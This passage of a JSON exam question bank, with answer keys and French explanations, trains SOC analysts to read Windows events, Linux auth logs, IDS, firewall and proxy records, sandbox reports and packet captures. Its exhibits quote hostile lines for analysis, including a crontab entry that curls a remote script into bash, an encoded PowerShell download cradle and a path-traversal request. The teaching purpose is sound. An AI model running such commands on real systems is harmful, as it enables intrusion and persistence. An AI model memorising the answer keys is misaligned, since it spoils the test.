ticket renewal","A local interactive logon at the console"],"a":[1],"e":"148 échecs (**4625**) en deux minutes depuis la même IP, puis un succès (**4624**) : brute force **réussi**. **Logon Type 3 = network** (SMB, par exemple). Un humain ne fait pas 148 essais en 2 minutes.","trap":"Logon types à connaître : **2** interactive (console), **3** network, **5** service, **10** RemoteInteractive (RDP).","x":"Event ID 4625  An account failed to log on.\n   Account Name: svc_backup   Logon Type: 3   Source Network Address: 10.20.30.44\n   (148 occurrences between 02:11:04 and 02:13:01)\nEvent ID 4624  An account was successfully logged on.\n   Account Name: svc_backup   Logon Type: 3   Source Network Address: 10.20.30.44\n   (02:13:02)","id":"3-029","d":3},{"t":"s","ref":"3.5","q":"During an investigation, an analyst finds Event ID 1102 in the Security log of a server. What does it indicate?","o":["A new service was installed","A user account was locked out","The audit log was cleared, which may be an attempt to cover tracks","The system time was changed"],"a":[2],"e":"**1102 = The audit log was cleared.** Typique d'un attaquant qui efface ses traces (anti-forensics). D'où l'intérêt de **centraliser les logs** dans un SIEM : ce qui est déjà parti ne peut plus être effacé.","id":"3-030","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. What do these two events suggest when no change request exists?","o":["A scheduled password rotation","An attacker created a local account and added it to the Administrators group to keep privileged access","A failed logon followed by an account lockout","A software update installing a service"],"a":[1],"e":"**4720** = compte créé. **4732** = membre ajouté à un groupe **local** de sécurité (ici Administrators). Sans demande de changement : **persistance + élévation de privilèges**.","x":"Event ID 4720  A user account was created.\n   New Account Name: support_adm      Subject Account Name: j.martin\nEvent ID 4732  A member was added to a security-enabled local group.\n   Member: WS-114\\support_adm          Group Name: Administrators","id":"3-031","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. Which activity does this System log entry most likely reveal?","o":["A Windows Update installation","A disk failure","Remote command execution with PsExec, a common lateral-movement technique","A DNS cache flush"],"a":[2],"e":"**7045 = A service was installed.** Le service `PSEXESVC` est déposé par **PsExec** sur la machine cible pour exécuter des commandes à distance. Outil d'admin légitime, très utilisé en **mouvement latéral**.","x":"Event ID 7045  A service was installed in the system.\n   Service Name:      PSEXESVC\n   Service File Name: %SystemRoot%\\PSEXESVC.exe\n   Service Type:      user mode service\n   Service Account:   LocalSystem","id":"3-032","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. Which attack is recorded in this Linux authentication log?","o":["A privilege escalation with sudo","An SSH password-guessing attack from a single source that tries many account names","A successful root login","A port scan"],"a":[1],"e":"Une même IP, des tentatives espacées de quelques secondes, des comptes génériques (`admin`, `oracle`, `root`) : **brute force / dictionnaire SSH**. Rien n'indique un succès (on chercherait `Accepted password`). Sur Debian : `/var/log/auth.log`, sur RHEL : `/var/log/secure`.","x":"Mar  3 02:11:07 web01 sshd[2231]: Failed password for invalid user admin from 203.0.113.77 port 40122 ssh2\nMar  3 02:11:09 web01 sshd[2231]: Failed password for invalid user oracle from 203.0.113.77 port 40156 ssh2\nMar  3 02:11:12 web01 sshd[2235]: Failed password for root from 203.0.113.77 port 40171 ssh2\nMar  3 02:11:15 web01 sshd[2235]: Failed password for root from 203.0.113.77 port 40188 ssh2","id":"3-033","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. What can the analyst conclude from this web server log entry?","o":["The request was blocked by the server","The requested page does not exist","A directory traversal attempt succeeded: the server answered 200 and returned content","The client was redirected to the login page"],"a":[2],"e":"`../../../../etc/passwd` = **path traversal**. Le code **200** et les 1843 octets renvoyés indiquent que le fichier a été **servi**. Un 403 ou un 404 aurait signalé un échec. Le User-Agent `curl` trahit un outil, pas un navigateur.","trap":"Classes HTTP : 2xx succès, 3xx redirection, 4xx erreur côté client (401 non authentifié, 403 interdit, 404 introuvable), 5xx erreur serveur.","x":"198.51.100.23 - - [12/Feb/2026:04:17:55 +0000] \"GET /download.php?file=../../../../etc/passwd HTTP/1.1\" 200 1843 \"-\" \"curl/8.5.0\"","id":"3-034","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. How should this command line be interpreted?","o":["A scheduled disk defragmentation","A normal Group Policy refresh","An obfuscated PowerShell command running hidden, a common way to download and execute a payload","A Windows Defender signature update"],"a":[2],"e":"`-NoP` (pas de profil), `-W Hidden` (fenêtre cachée), `-Enc` (commande encodée en **Base64**) : trio typique d'un *download cradle*. `SQBFAFgA` est le début de `IEX` (Invoke-Expression) en UTF-16LE. Le parent `winword.exe` indique une **macro malveillante**.","x":"ParentImage:  C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nImage:        C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine:  powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA...","id":"3-035","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. Which conclusion is supported by this crontab entry found on a Linux web server?","o":["Logs are rotated every five minutes","A persistence mechanism downloads and executes a remote script every five minutes","The server synchronizes its clock with an NTP source","A backup job runs at 05:00 each day"],"a":[1],"e":"`*/5 * * * *` = toutes les 5 minutes. `curl … | bash` = télécharge et **exécute** ce que renvoie le serveur distant. **Persistance + canal C2** (souvent des cryptomineurs).","x":"*/5 * * * * curl -fsSL http://203.0.113.9/x.sh | bash >/dev/null 2>&1","id":"3-036","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. What does this SIEM notable event most likely indicate?","o":["A misconfigured NTP server","Compromised credentials: the same account logged in from two distant countries within a time span that makes travel impossible","A load-balancing problem on the VPN gateway","A user who changed their password"],"a":[1],"e":"Règle de corrélation « **impossible travel** » : deux authentifications réussies, géographiquement incompatibles avec le délai. À recouper : VPN d'entreprise ou personnel, MFA, appareil utilisé. C'est la valeur ajoutée du SIEM : **corréler**.","x":"rule=\"Impossible travel\"  severity=high  user=c.durand\n 09:02:11 UTC  login success  src=81.250.x.x    geo=FR (Orleans)   app=O365\n 09:19:47 UTC  login success  src=102.89.x.x    geo=NG (Lagos)     app=O365\n distance=4,560 km   delta=17 min   mfa=not_prompted","id":"3-037","d":3},{"t":"s","ref":"3.5","q":"Refer to the exhibit. What does this SOAR platform log show?","o":["A failed attempt to send an email","An analyst manually blocking a URL on the proxy","An automated playbook that enriched the indicators, performed containment actions and then opened a case for an analyst","A vulnerability scan of the mail server"],"a":[2],"e":"Lecture d'un log **SOAR** : déclencheur (mail signalé), **enrichissement** (extraction et réputation), **confinement automatique** (blocage de l'URL, quarantaine de 14 boîtes), puis création d'un ticket pour le Tier 2. Aucune action humaine avant l'étape 5.","trap":"Dans ce log, les étapes 3 et 4 relèvent de la phase **Containment** du NIST 800-61 ; les étapes 1 et 2 de **Detection and Analysis**.","x":"[playbook:phishing-triage] run_id=8841 trigger=email_reported_by_user\n step1 extract_indicators    url=hxxp://login-micros0ft[.]support/x  sha256=ab12...9f  status=done\n step2 reputation_lookup     verdict=malicious score=92                           status=done\n step3 block_url_on_proxy                                                         status=done\n step4 quarantine_mailboxes  matched=14                                           status=done\n step5 create_ticket         INC-20931 assigned=tier2                             status=done","id":"3-038","d":3},{"t":"s","ref":"3.6","q":"What is a detonation chamber in malware analysis?","o":["A tool that disassembles binaries without running them","An isolated environment (sandbox) in which a suspicious file is executed so that its behavior can be observed safely","A database of known malware hashes","A firewall feature that drops fragmented packets"],"a":[1],"e":"Detonation chamber = **sandbox** : on « fait détoner » l'échantillon dans un environnement isolé et instrumenté pour observer fichiers, registre, processus et réseau. C'est de l'**analyse dynamique**. Exemples : Cisco Secure Malware Analytics (ex-Threat Grid), Cuckoo, ANY.RUN.","id":"3-039","d":3},{"t":"s","ref":"3.6","q":"Refer to the exhibit. Which entry indicates that the malware establishes persistence?","o":["The DNS query","The HTTP POST every 60 seconds","The value written under the Run registry key","The SHA256 of the sample"],"a":[2],"e":"La clé **Run** sous HKCU relance `svch0st.exe` à chaque ouverture de session : **persistance**. Remarque le nom `svch0st` (zéro à la place du o) qui imite `svchost.exe`.","x":"Sample: invoice_0392.docm            SHA256: 9f2c41d0...77e1a7\nVerdict: MALICIOUS  (score 95/100)\nBehaviors:\n  - WINWORD.EXE spawned cmd.exe -> powershell.exe\n  - File created: C:\\Users\\Public\\svch0st.exe\n  - Registry set: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\n  - DNS query:    cdn-update-check[.]com -> 185.203.116.12\n  - HTTP POST     hxxp://185.203.116.12/gate.php  (every 60 s)","id":"3-040","d":3},{"t":"s","ref":"3.6","q":"Refer to the same sandbox report. What does the HTTP POST repeated every 60 seconds most likely represent?","o":["A Windows Update check","A DNS zone transfer","Command-and-control beaconing","A port scan of the internal network"],"a":[2],"e":"POST périodique vers une IP et un `gate.php` : l'implant **s'annonce au C2** et récupère ses ordres. Le domaine et l'IP deviennent des **IoC réseau** à bloquer et à rechercher dans les logs proxy, DNS et NetFlow.","x":"Sample: invoice_0392.docm            SHA256: 9f2c41d0...77e1a7\nVerdict: MALICIOUS  (score 95/100)\nBehaviors:\n  - WINWORD.EXE spawned cmd.exe -> powershell.exe\n  - File created: C:\\Users\\Public\\svch0st.exe\n  - Registry set: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater\n  - DNS query:    cdn-update-check[.]com -> 185.203.116.12\n  - HTTP POST     hxxp://185.203.116.12/gate.php  (every 60 s)","id":"3-041","d":3},{"t":"s","ref":"3.6","q":"An analyst wants to find every endpoint that holds the same malicious file, even if it was renamed. Which element of the sandbox report should be used?","o":["The file name","The file size","The SHA-256 hash","The detonation timestamp"],"a":[2],"e":"Le **hash** identifie le **contenu**, quel que soit le nom. Limite : un seul octet modifié change le hash, donc le malware polymorphe échappe aux IoC par hash. Privilégier **SHA-256** : MD5 et SHA-1 ont des collisions connues.","id":"3-042","d":3},{"t":"s","ref":"3.6","q":"In a malware report, a URL is written as hxxp://malicious-site[.]com/payload. Why?","o":["The sandbox could not resolve the domain","The URL is defanged so that nobody can click it or have it resolved automatically by mistake","The site uses a proprietary protocol called hxxp","The URL has been encrypted"],"a":[1],"e":"**Defanging** : `hxxp` et `[.]` neutralisent le lien dans les rapports, mails et tickets. À « re-fanger » avant de l'utiliser dans une règle de blocage.","id":"3-043","d":3},{"t":"s","ref":"3.6","q":"Which statement correctly compares static and dynamic malware analysis?","o":["Static analysis executes the sample; dynamic analysis only reads its strings","Static analysis examines the file without running it; dynamic analysis observes its behavior while it runs in a controlled environment","Dynamic analysis is always safer than static analysis","Static analysis requires network access to the C2 server"],"a":[1],"e":"**Static** = sans exécution : hash, strings, imports, en-têtes PE, désassemblage. **Dynamic** = exécution en sandbox : comportement réel. Limite du dynamique : certains malwares **détectent la sandbox** (VM, absence d'activité humaine) et restent dormants.","id":"3-044","d":3},{"t":"m","ref":"3.6","q":"Which two items from a sandbox report are network-based indicators that can be blocked at the perimeter? (Choose two.)","o":["The domain name contacted by the sample","The mutex created by the sample","The registry key written by the sample","The destination IP address of the HTTP POST requests","The name of the dropped executable"],"a":[0,3],"e":"**Réseau** : domaines, IP, URL, User-Agent, empreintes TLS. **Hôte** : hash, chemins de fichiers, clés de registre, mutex, services. Un rapport de sandbox se lit selon trois axes : *hashes*, *URLs*, *systems / events / networking*.","id":"3-045","d":3},{"t":"s","ref":"4.1","q":"Refer to the exhibit. Which technology generated this event?","o":["Traditional stateful firewall","NetFlow collector","IDS/IPS","Web proxy"],"a":[2],"e":"Format **Snort** : `[**] [GID:SID:REV] message [**]`, puis *Classification* et *Priority*, puis horodatage et `src -> dst`. Un message qui **nomme une menace** et se réfère à une règle = IDS/IPS.","trap":"`1:2019401:3` = **G**enerator ID : **S**ignature ID : **R**evision.","x":"[**] [1:2019401:3] ET TROJAN Possible GameOver Zeus C2 Beacon [**]\n[Classification: A Network Trojan was detected] [Priority: 1]\n03/02-11:41:07.553212 10.1.5.22:49233 -> 91.219.29.81:80\nTCP TTL:128 TOS:0x0 ID:2113 IpLen:20 DgmLen:312 DF","id":"4-001","d":4},{"t":"s","ref":"4.1","q":"Refer to the exhibit. Which technology generated this event?","o":["IDS/IPS","Firewall","Antivirus","Proxy server"],"a":[1],"e":"Syslog **Cisco ASA** : `%ASA-<sévérité>-<ID>`. **106023** = paquet refusé par une ACL (`Deny … by access-group`). Un firewall journalise des **décisions permit / deny** sur le 5-tuple, sans nommer de menace.","trap":"Ici la sévérité syslog est **4 = Warning**. La cible est le port 3389 (RDP) exposé : tentative d'accès depuis Internet, bloquée.","x":"%ASA-4-106023: Deny tcp src outside:198.51.100.14/51512 dst inside:10.0.0.15/3389 by access-group \"OUTSIDE_IN\" [0x0, 0x0]","id":"4-002","d":4},{"t":"s","ref":"4.1","q":"Refer to the exhibit. Which technology generated this event?","o":["NetFlow","Host-based firewall","IDS/IPS","Proxy log"],"a":[3],"e":"Log **Squid** : horodatage epoch, durée, IP cliente, `TCP_MISS/200` (résultat du cache / code HTTP), octets, **méthode + URL complète**, type MIME. URL + code HTTP + statut de cache = **proxy web**. Ici, un poste télécharge un `.exe` (`application/x-msdownload`).","x":"1772445000.123    215 10.2.3.44 TCP_MISS/200 48211 GET http://update-flash-player.example/download.exe - HIER_DIRECT/203.0.113.80 application/x-msdownload","id":"4-003","d":4},{"t":"s","ref":"4.1","q":"Refer to the exhibit. Which technology generated this record?","o":["Full packet capture","NetFlow (transaction data)","IDS/IPS","Email content filter"],"a":[1],"e":"Durée, protocole, `IP:port -> IP:port`, **compteurs de paquets et d'octets**, aucun contenu : c'est un **enregistrement de flux** (NetFlow via nfdump). 1,9 Mo sortants vers le port 9001 (port relais Tor courant) mériterait un coup d'œil.","x":"Date first seen          Duration Proto    Src IP Addr:Port       Dst IP Addr:Port    Packets    Bytes Flows\n2026-03-02 09:14:10.220    12.480 TCP     10.10.20.15:51322 ->   185.220.101.4:9001     2210    1.9 M     1","id":"4-004","d":4},{"t":"d","ref":"4.1","q":"Drag and drop each event onto the technology that produced it.","l":["Threat: Trojan.GenericKD  File: C:\\Users\\jdoe\\Downloads\\setup.exe  Action: Quarantined","Application: BitTorrent  Category: P2P  User: jsmith  Action: Block","Built inbound TCP connection 8812 for outside:203.0.113.5/44123 to dmz:10.0.5.10/443","ET SCAN Nmap Scripting Engine User-Agent Detected  [Priority: 2]"],"r":["Antivirus","Network application control","Firewall","IDS/IPS","Proxy log"],"a":[0,1,2,3],"e":"Indices : **fichier + quarantaine** → antivirus. **Nom d'application + catégorie + utilisateur** → contrôle applicatif (AVC, NGFW). **Built / Teardown / Deny + interfaces** → firewall. **Nom de signature + priorité** → IDS/IPS.","id":"4-005","d":4},{"t":"s","ref":"4.2","q":"An attacker exfiltrates data for three weeks and no security control raises an alert. How is this situation classified?","o":["True positive","False positive","True negative","False negative"],"a":[3],"e":"**False negative** = attaque réelle, **aucune alerte**. C'est le cas le plus dangereux : l'impact est réel et personne ne le sait.","trap":"Lecture : le 2e mot (positive / negative) = y a-t-il eu une **alerte** ? Le 1er mot (true / false) = l'outil avait-il **raison** ?","id":"4-006","d":4},{"t":"s","ref":"4.2","q":"An IPS raises an alert for an SQL injection. The analyst verifies that the request was a legitimate query from the internal reporting tool. How is this alert classified?","o":["True positive","False positive","False negative","True negative"],"a":[1],"e":"**False positive** = alerte, mais pas d'attaque. **Pas d'impact sécurité**, mais un coût : temps d'analyste, fatigue d'alerte. Action : affiner la règle (tuning).","id":"4-007","d":4},{"t":"d","ref":"4.2","q":"Drag and drop each situation onto its classification.","l":["Alert raised, and the attack is confirmed","No alert, and no malicious activity took place","Alert raised, but the traffic was legitimate","No alert, but a real attack took place"],"r":["True positive","True negative","False positive","False negative"],"a":[0,1,2,3],"e":"TP = alerte justifiée (impact, incident à traiter). TN = silence justifié (normal). FP = fausse alerte (pas d'impact, du bruit). FN = attaque manquée (impact, le pire).","id":"4-008","d":4},{"t":"m","ref":"4.2","q":"Which two classifications correspond to a situation that has a real security impact on the organization? (Choose two.)","o":["True positive","False positive","True negative","False negative","Benign"],"a":[0,3],"e":"**Impact** = une attaque a réellement eu lieu : **true positive** (détectée) et **false negative** (non détectée). False positive, true negative et benign = **no impact** côté sécurité.","id":"4-009","d":4},{"t":"s","ref":"4.2","q":"The IPS correctly detects a port scan. The investigation shows that it was the weekly vulnerability scan run by the internal security team. How should this event be categorized?","o":["False negative","True negative","Benign: the detection is accurate, but the activity poses no threat","False positive, because the signature matched traffic that was not a scan"],"a":[2],"e":"**Benign** = la signature a vu juste (c'était bien un scan), mais l'activité est **autorisée** et sans danger. Ce n'est pas un faux positif au sens strict, où la signature se serait trompée sur la nature du trafic. Action : exclure ou étiqueter la source du scanner.","id":"4-010","d":4},{"t":"s","ref":"4.3","q":"Which statement describes stateless packet filtering?","o":["It tracks each connection in a state table","It reassembles application payloads to identify applications","It evaluates each packet independently against rules based on Layer 3 and Layer 4 header fields","It decrypts TLS sessions to inspect their content"],"a":[2],"e":"**Packet filtering** = ACL : IP, protocole, ports, flags, **paquet par paquet**, sans mémoire. Rapide, mais incapable de savoir si un paquet appartient à une session légitime.","id":"4-011","d":4},{"t":"s","ref":"4.3","q":"What does a stateful firewall do that a stateless packet filter cannot?","o":["Identify applications regardless of the port they use","Track the state of connections, so that return traffic of an established session is allowed dynamically and out-of-state packets are dropped","Inspect the content of encrypted payloads","Assign reputation scores to URLs"],"a":[1],"e":"**Stateful** = table d'états (5-tuple, état TCP, numéros de séquence). Le retour d'une session initiée de l'intérieur est permis automatiquement ; un ACK sans SYN préalable est jeté. Il ne regarde pas le **contenu** applicatif.","id":"4-012","d":4},{"t":"s","ref":"4.3","q":"A company wants to block BitTorrent and an unauthorized remote-access tool even when they run over TCP port 443, while still allowing normal web browsing. Which capability is required?","o":["Stateless packet filtering","Stateful inspection","Deep packet inspection","Network address translation"],"a":[2],"e":"Distinguer des applications **sur le même port** demande de lire au-delà de la couche 4 : **DPI** (signatures applicatives, analyse protocolaire, couche 7). C'est ce qui définit un NGFW. Coût : CPU, latence, et aveuglement si le flux est chiffré sans déchiffrement.","id":"4-013","d":4},{"t":"s","ref":"4.3","q":"A TCP segment with only the ACK flag set reaches a firewall, and no matching connection exists. How do the two firewall types react?","o":["Both always forward it","A stateless filter may permit it if a rule matches its header fields, whereas a stateful firewall drops it because no session entry exists","A stateful firewall forwards it, a stateless filter always drops it","Both convert it into a SYN segment"],"a":[1],"e":"C'est le principe du **ACK scan** : un filtre sans état avec une règle de type `established` laisse passer, le stateful non. Utile pour cartographier les règles d'un firewall.","id":"4-014","d":4},{"t":"s","ref":"4.4","q":"Which statement about an inline IPS deployment is correct?","o":["It receives only a copy of the traffic, so it cannot affect production flows","Traffic passes through the sensor, which can drop malicious packets in real time but adds latency and may become a point of failure","It cannot use signatures","It is invisible to the traffic and adds no delay"],"a":[1],"e":"**Inline** = dans le chemin : peut **bloquer** (y compris le premier paquet), mais ajoute de la latence et pose la question du *fail-open* ou *fail-closed*.","id":"4-015","d":4},{"t":"s","ref":"4.4","q":"What is a limitation of an IDS deployed in passive (promiscuous) mode on a copy of the traffic?","o":["It adds latency to every packet","It must be configured as the default gateway","It cannot stop the triggering packet, because it only sees a copy of traffic that has already been forwarded","It cannot generate alerts"],"a":[2],"e":"**Passif** = détection et alerte, aucun impact sur le flux, mais **pas de blocage direct** : le paquet d'origine est déjà passé. Au mieux, il demande à un autre équipement de bloquer ou envoie des TCP resets.","id":"4-016","d":4},{"t":"s","ref":"4.4","q":"Which statement correctly compares a network tap with a SPAN (port mirroring) session?","o":["A tap is a switch feature; SPAN requires dedicated hardware","A tap is a passive hardware device that copies all traffic, including errors, without burdening the switch; a SPAN port may drop packets under load and does not forward corrupted frames","SPAN is undetectable, while a tap changes the MAC addresses","Both modify the production traffic they copy"],"a":[1],"e":"**Tap** = matériel passif inséré sur le lien : copie fidèle et complète, indépendante de la charge du switch. **SPAN** = fonction du switch : simple et gratuite, mais best effort (pertes si le port miroir sature, trames en erreur écartées, CPU du switch sollicité).","id":"4-017","d":4},{"t":"s","ref":"4.4","q":"A SOC needs to capture traffic on a critical 10 Gbps link for forensic purposes, with the guarantee that no packet is lost and that production traffic is never affected. Which solution is the most appropriate?","o":["A SPAN session on the access switch","An inline IPS in fail-closed mode","A passive network tap","A NetFlow exporter"],"a":[2],"e":"Exigences « zéro perte + zéro impact » = **tap passif**. SPAN peut perdre des paquets, l'inline est dans le chemin, NetFlow ne capture pas les paquets.","id":"4-018","d":4},{"t":"s","ref":"4.5","q":"Which statement correctly compares the data obtained from a tap with NetFlow data?","o":["NetFlow contains the payload; a tap provides only headers","A tap delivers complete packets that allow content reconstruction, while NetFlow delivers summarized flow metadata that scales well but carries no payload","Both provide exactly the same level of detail","NetFlow requires more storage than full packet capture"],"a":[1],"e":"**Tap / capture complète** = tout, lourd, rétention courte, forensique fine. **NetFlow** = résumé, léger, rétention longue, idéal pour les baselines, les top talkers et la détection d'anomalies.","id":"4-019","d":4},{"t":"s","ref":"4.5","q":"An analyst must prove which document was exfiltrated during a session that took place yesterday. Which data source can answer this question?","o":["NetFlow records","Firewall connection logs","Full packet capture of the session","SNMP interface counters"],"a":[2],"e":"Savoir **quel fichier** = besoin du **payload**. NetFlow et les logs firewall disent qu'un transfert de X Mo a eu lieu vers telle IP, pas ce qu'il contenait. Et si la session était chiffrée, même la capture ne suffit pas sans les clés.","id":"4-020","d":4},{"t":"s","ref":"4.5","q":"A SOC wants to keep six months of 'who talked to whom, when and how much' for the whole campus with minimal storage. Which data source is the best fit?","o":["Full packet capture from taps","NetFlow","Wireshark captures on each host","IPS alert data only"],"a":[1],"e":"Six mois de capture complète sur un campus = pétaoctets. **NetFlow** (ou IPFIX) donne la vue conversationnelle pour une fraction du stockage.","id":"4-021","d":4},{"t":"s","ref":"4.6","q":"In Wireshark, which menu path extracts the files that were transferred over HTTP in a capture?","o":["Analyze > Decode As","Statistics > Conversations","File > Export Objects > HTTP","Edit > Find Packet"],"a":[2],"e":"**File > Export Objects > HTTP** liste tous les objets HTTP (nom, type, taille) et permet de les sauvegarder. Existe aussi pour SMB, TFTP, IMF (mail), DICOM et FTP-DATA.","id":"4-022","d":4},{"t":"s","ref":"4.6","q":"An analyst wants to carve a file out of a raw TCP session that Wireshark cannot export as an object. Which procedure is correct?","o":["Apply the display filter tcp.port == 80 and print the packet list","Right-click a packet of the session, select Follow > TCP Stream, show the data as Raw, and save it","Use Statistics > Protocol Hierarchy and export as CSV","Enable name resolution and reload the capture"],"a":[1],"e":"**Follow > TCP Stream** réassemble la conversation. Sélectionner un seul sens si besoin, afficher en **Raw** (pas en ASCII) puis **Save as**. Enlever ensuite les en-têtes protocolaires éventuels avant le début du fichier.","id":"4-023","d":4},{"t":"s","ref":"4.6","q":"Refer to the exhibit. The URL requested was /images/logo.jpg. What does the beginning of the response body reveal?","o":["The file is a valid JPEG image","The file is a PDF document","The file is a Windows executable disguised as an image","The file is a ZIP archive"],"a":[2],"e":"`MZ` (0x4D 0x5A) et « This program cannot be run in DOS mode » = en-tête **PE**, donc un **exécutable Windows**. Un JPEG commence par `FF D8 FF`. L'extension ment, les **magic bytes** non.","trap":"Magic numbers utiles : `MZ` = EXE/DLL, `%PDF` = PDF, `PK` = ZIP et Office OpenXML, `7F 45 4C 46` = ELF, `89 50 4E 47` = PNG, `FF D8 FF` = JPEG.","x":"HTTP/1.1 200 OK\nContent-Type: image/jpeg\nContent-Length: 73802\n\nMZ......................@...............................................\n........!..L.!This program cannot be run in DOS mode....$.......","id":"4-024","d":4},{"t":"s","ref":"4.7","q":"Refer to the exhibit. Which activity is shown, and what can be deduced?","o":["A SYN flood against 10.0.0.66","A TCP SYN (half-open) port scan from 10.0.0.66; port 22 is open on 10.0.0.10, ports 21 and 23 are closed","A normal SSH session between two hosts","An ARP poisoning attack"],"a":[1],"e":"Une source, une cible, des ports de destination qui **défilent** : scan. **SYN → SYN/ACK → RST** du scanner = port **ouvert**, connexion jamais terminée (*half-open / stealth*). **SYN → RST/ACK** de la cible = port **fermé**.","x":"No.  Time      Source       Destination  Proto  Info\n1    0.000000  10.0.0.66    10.0.0.10    TCP    51000 > 21 [SYN]\n2    0.000120  10.0.0.10    10.0.0.66    TCP    21 > 51000 [RST, ACK]\n3    0.000410  10.0.0.66    10.0.0.10    TCP    51001 > 22 [SYN]\n4    0.000530  10.0.0.10    10.0.0.66    TCP    22 > 51001 [SYN, ACK]\n5    0.000610  10.0.0.66    10.0.0.10    TCP    51001 > 22 [RST]\n6    0.000900  10.0.0.66    10.0.0.10    TCP    51002 > 23 [SYN]\n7    0.001010  10.0.0.10    10.0.0.66    TCP    23 > 51002 [RST, ACK]","id":"4-025","d":4},{"t":"s","ref":"4.7","q":"Refer to the exhibit. Which attack does this capture reveal?","o":["DHCP starvation","ARP spoofing: two different MAC addresses claim the IP address of the gateway","MAC flooding","DNS cache poisoning"],"a":[1],"e":"La passerelle 192.168.1.1 est annoncée par **deux MAC** ; la seconde insiste avec des réponses non sollicitées. Wireshark le signale par « duplicate use of … detected ». Attaquant = `de:ad:be:ef:00:01`.","x":"1  aa:aa:aa:00:00:50 > ff:ff:ff:ff:ff:ff  ARP  Who has 192.168.1.1? Tell 192.168.1.50\n2  00:11:22:33:44:55 > aa:aa:aa:00:00:50  ARP  192.168.1.1 is at 00:11:22:33:44:55\n3  de:ad:be:ef:00:01 > aa:aa:aa:00:00:50  ARP  192.168.1.1 is at de:ad:be:ef:00:01\n4  de:ad:be:ef:00:01 > aa:aa:aa:00:00:50  ARP  192.168.1.1 is at de:ad:be:ef:00:01\n   [Duplicate IP address detected for 192.168.1.1 (de:ad:be:ef:00:01) - also in use by 00:11:22:33:44:55]","id":"4-026","d":4},{"t":"s","ref":"4.7","q":"Refer to the exhibit. What is the most likely explanation for this DNS traffic?","o":["Normal browsing activity","A DNS zone transfer","Data exfiltration or C2 through DNS tunneling","A DNS amplification attack against 10.1.2.33"],"a":[2],"e":"Requêtes **TXT** en rafale, sous-domaines **longs et aléatoires** (données encodées), toujours vers le même domaine : **tunnel DNS**. Une amplification montrerait de grosses *réponses* non sollicitées arrivant sur la victime.","x":"10.1.2.33 > 10.1.0.2  DNS  Standard query TXT dGhpcyBpcyBzZWNyZXQgZGF0YSBjaHVuazAx.x7.badcdn.example\n10.1.2.33 > 10.1.0.2  DNS  Standard query TXT YW5vdGhlciBjaHVuayBvZiBzdG9sZW4gZGF0YTAy.x7.badcdn.example\n10.1.2.33 > 10.1.0.2  DNS  Standard query TXT bW9yZSBkYXRhIGJlaW5nIGV4ZmlsdHJhdGVkMDM.x7.badcdn.example\n   (2,114 similar queries in 5 minutes)","id":"4-027","d":4},{"t":"s","ref":"4.7","q":"Which Wireshark display filter shows only the traffic to or from host 10.1.1.5 on TCP port 445?","o":["host 10.1.1.5 and tcp port 445","ip.addr == 10.1.1.5 && tcp.port == 445","ip.src = 10.1.1.5 | port 445","tcp.port eq 445 host 10.1.1.5"],"a":[1],"e":"**Display filter** Wireshark : `champ == valeur`, opérateurs `&&` et `||`. La première proposition est une syntaxe **BPF de capture** (tcpdump, capture filter), refusée dans la barre de filtre d'affichage.","trap":"Capture filter (BPF) = appliqué *pendant* la capture, non réversible. Display filter = appliqué *après*, n'efface rien.","id":"4-028","d":4},{"t":"s","ref":"4.7","q":"Refer to the exhibit. Which statement identifies the client and the server correctly, and why is the flow suspicious?","o":["10.1.4.20 is the server because it has the lower IP address","10.1.4.20 listens on TCP 4444 and an external host connects to it: an internal workstation acting as a server on a port often used by backdoors","203.0.113.99 is the server because it uses port 51873","The flow is a normal HTTPS download"],"a":[1],"e":"Celui qui reçoit le **SYN** sur un port fixe est le **serveur** ; le port élevé éphémère (51873) est côté **client**. Un poste de travail qui écoute sur **4444** (port par défaut de Metasploit) et accepte une connexion entrante : *bind shell* probable.","x":"203.0.113.99:51873 > 10.1.4.20:4444   [SYN]\n10.1.4.20:4444     > 203.0.113.99:51873 [SYN, ACK]\n203.0.113.99:51873 > 10.1.4.20:4444   [ACK]\n203.0.113.99:51873 > 10.1.4.20:4444   [PSH, ACK] Len=17  \"whoami && ipconfig\"","id":"4-029","d":4},{"t":"s","ref":"4.8","q":"A captured packet arrives with an IPv4 TTL of 121. Which statement is the most reasonable interpretation?","o":["The sender is a Linux host located 121 hops away","The sender probably uses an initial TTL of 128 (typical of Windows) and is 7 hops away","The packet was fragmented 121 times","The TTL value is the length of the payload"],"a":[1],"e":"TTL initiaux courants : **64** (Linux, macOS), **128** (Windows), **255** (équipements réseau). Chaque routeur décrémente de 1. 121 = 128 − 7. Utile pour du fingerprinting passif ou pour repérer une IP usurpée (TTL incohérent).","id":"4-030","d":4},{"t":"s","ref":"4.8","q":"Which value in the Protocol field of an IPv4 header indicates that the payload is a UDP datagram?","o":["1","6","17","47"],"a":[2],"e":"**1 = ICMP, 6 = TCP, 17 = UDP.** Aussi : 47 = GRE, 50 = ESP, 89 = OSPF. En IPv6, le champ équivalent s'appelle **Next Header**.","id":"4-031","d":4},{"t":"s","ref":"4.8","q":"Which statement about the IPv6 header is correct?","o":["It contains a header checksum that every router recalculates","Its size varies between 20 and 60 bytes","It has a fixed size of 40 bytes, uses Hop Limit instead of TTL, and leaves fragmentation to the source host","It uses 64-bit addresses"],"a":[2],"e":"IPv6 : en-tête fixe de **40 octets**, pas de checksum, **Hop Limit**, **Next Header** (chaîne d'en-têtes d'extension), fragmentation par la **source** uniquement. Adresses de 128 bits.","id":"4-032","d":4},{"t":"s","ref":"4.8","q":"Which combination of TCP flags characterizes an Xmas scan?","o":["SYN only","SYN and ACK","FIN, PSH and URG","No flag at all"],"a":[2],"e":"**Xmas scan** = FIN + PSH + URG « allumés comme un sapin ». **NULL scan** = aucun flag. **SYN scan** = SYN seul. Ces combinaisons n'existent pas dans un trafic normal : c'est un marqueur de 